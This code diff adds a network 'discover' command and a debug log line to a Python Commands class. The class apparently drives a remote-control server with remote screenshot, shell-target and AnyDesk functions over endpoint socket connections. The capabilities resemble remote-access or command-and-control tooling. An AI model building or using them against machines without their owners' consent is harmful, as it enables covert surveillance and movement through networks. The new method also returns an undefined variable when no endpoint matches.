@@ -22,9 +22,21 @@ class Commands:
     def call_screenshot(self):
         matching_endpoint = self.find_matching_endpoint()
         if matching_endpoint:
+            self.logger.debug("Initializing Screenshot class...")
             sc = Screenshot(self.main_path, self.log_path, matching_endpoint, self.server, self.shell_target)
             if sc.run():
                 return True
+
+    def call_discover(self):
+        matching_endpoint = self.find_matching_endpoint()
+        if matching_endpoint:
+            self.logger.debug(f"Sending 'discover' to {matching_endpoint.ip}...")
+            matching_endpoint.conn.send('discover'.encode())
+            msg = matching_endpoint.conn.recv(2048)
+            self.logger.debug(f"{matching_endpoint.ip}: {msg}")
+            active_hosts = json.loads(msg)
+
+        return active_hosts
 
     def call_anydesk(self) -> bool:
         self.logger.info(f'Running anydesk_command...')
